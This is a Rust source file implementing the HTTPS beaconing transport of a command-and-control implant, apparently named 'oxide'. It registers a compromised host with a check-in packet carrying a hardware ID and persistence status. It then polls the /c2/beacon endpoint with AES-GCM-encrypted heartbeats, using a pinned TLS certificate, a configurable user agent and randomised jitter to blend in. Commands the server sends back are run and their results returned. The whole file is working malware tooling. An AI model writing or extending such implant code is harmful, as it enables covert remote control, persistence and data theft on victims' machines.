// HTTPS beacon transport — POSTs AES-GCM packets to /c2/beacon.
// Stateless: random nonce per request. TLS: pinned cert (PinnedCertVerifier from tls.rs).

use anyhow::{anyhow, Context, Result};
use oxide_shared::packet::Packet;
use rand::Rng;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;

use super::tls::PinnedCertVerifier;
use crate::checkin;
use crate::config::Config;
use crate::dispatcher::Dispatcher;
use crate::persistence::PersistenceChain;

pub struct HttpTransport {
    client: reqwest::Client,
    beacon_url: String,
    key: [u8; 32],
    beacon_interval: Duration,
    jitter: f64,
    hwid: String,
}

impl HttpTransport {
    pub async fn connect(config: &Config) -> Result<Self> {
        let verifier = Arc::new(PinnedCertVerifier {
            expected_hash: config.cert_hash,
        });
        let rustls_cfg =
            rustls::ClientConfig::builder_with_protocol_versions(&[&rustls::version::TLS13])
                .dangerous()
                .with_custom_certificate_verifier(verifier)
                .with_no_client_auth();

        let client = reqwest::Client::builder()
            .use_preconfigured_tls(rustls_cfg)
            .user_agent(&config.user_agent)
            .build()
            .context("build reqwest client")?;

        let key = oxide_shared::derive_key(&config.psk, &config.salt);
        let beacon_url = format!("https://{}:{}/c2/beacon", config.host, config.port);

        Ok(Self {
            client,
            beacon_url,
            key,
            beacon_interval: config.beacon_interval,
            jitter: config.beacon_jitter,
            hwid: String::new(),
        })
    }

    async fn post_packet(&self, packet: &Packet) -> Result<Option<Packet>> {
        let ct = oxide_shared::encrypt_stateless(&self.key, &serde_json::to_vec(packet)?);
        let resp = self
            .client
            .post(&self.beacon_url)
            .body(ct)
            .header("Content-Type", "application/octet-stream")
            .send()
            .await
            .context("beacon POST")?;

        let status = resp.status();
        if status == reqwest::StatusCode::NO_CONTENT {
            return Ok(None);
        }
        anyhow::ensure!(status.is_success(), "beacon error: {status}");
        let body = resp.bytes().await.context("read response")?;
        let plain = oxide_shared::decrypt_stateless(&self.key, &body)
            .map_err(|e| anyhow!("decrypt: {e:?}"))?;
        Ok(Some(
            serde_json::from_slice(&plain).context("parse packet")?,
        ))
    }

    fn jittered_secs(&self) -> f64 {
        let i = self.beacon_interval.as_secs_f64();
        (i + i * self.jitter * rand::thread_rng().gen_range(-1.0_f64..1.0)).max(1.0)
    }

    pub async fn run(&mut self, dispatch: &Dispatcher, chain: &PersistenceChain) -> Result<()> {
        // Check-in
        let checkin_pkt = checkin::build_checkin_packet(&chain.check_all());
        self.hwid = checkin_pkt.data["hwid"].as_str().unwrap_or("").to_string();
        let ack = self
            .post_packet(&checkin_pkt)
            .await?
            .ok_or_else(|| anyhow!("no checkin_ack"))?;
        eprintln!(
            "[+] HTTP registered, session: {}",
            ack.data["session_id"].as_str().unwrap_or("?")
        );

        // Beacon loop — drain command queue on each iteration
        loop {
            let hb = Packet::new("heartbeat", serde_json::json!({"hwid": self.hwid}));
            let mut next = self.post_packet(&hb).await?;
            while let Some(pkt) = next {
                if pkt.packet_type != "command" {
                    break;
                }
                let mut resp = dispatch.dispatch(&pkt);
                // HTTP mode is stateless — server needs hwid in every packet
                if let Some(obj) = resp.data.as_object_mut() {
                    obj.insert(
                        "hwid".to_string(),
                        serde_json::Value::String(self.hwid.clone()),
                    );
                }
                next = self.post_packet(&resp).await?;
            }
            sleep(Duration::from_secs_f64(self.jittered_secs())).await;
        }
    }
}
